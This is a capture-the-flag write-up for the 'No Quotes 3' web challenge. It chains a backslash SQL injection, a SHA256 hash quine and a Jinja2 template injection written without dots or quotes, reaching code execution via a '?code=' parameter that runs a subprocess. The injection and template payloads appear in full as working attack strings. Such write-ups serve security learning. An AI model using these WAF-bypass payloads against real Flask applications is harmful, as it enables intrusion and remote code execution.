# Web - No Quotes 3

## Challenge
Flask app with SQL injection and SSTI, but WAF blocks `'`, `"`, and `.`

## Exploit Chain

### 1. SQL Injection via Backslash
Username ending with `\` escapes the closing quote:
```
username: PAYLOAD\
password: ) UNION SELECT ...
```
Results in: `WHERE username = ('PAYLOAD\') AND password = ('...')`

### 2. SHA256 Hash Quine
App checks `SHA256(password) == row[1]`. We use SQL `REPLACE()` to make the DB compute our password's hash:
```sql
SHA2(REPLACE(template, "$", CONCAT("0x", HEX(template))), 256)
```

### 3. SSTI Without Dots/Quotes
Replace `.attr` with `|attr()` filter, generate strings using `dict(key=1)|list|first`:
```jinja2
{{config|attr(dict(from_envvar=1)|list|first)|attr(dict(__globals__=1)|list|first)|attr(dict(get=1)|list|first)(dict(__builtins__=1)|list|first)|attr(dict(get=1)|list|first)(dict(eval=1)|list|first)(request|attr(dict(values=1)|list|first)|attr(dict(get=1)|list|first)(dict(code=1)|list|first))}}
```

### 4. RCE
Pass code via URL parameter: `?code=__import__('subprocess').check_output(['/readflag'])`

**Flag:** `uoftctf{r3cuR510n_7h30R3M_m0M3n7}`

## Attachments

- [solve.py](https://raw.githubusercontent.com/rehackxyz/REUN10N/main/CTF-writeups/2026/uoftctf-2026/assets/noquotes3-solve.py)


Solved by: jerit3787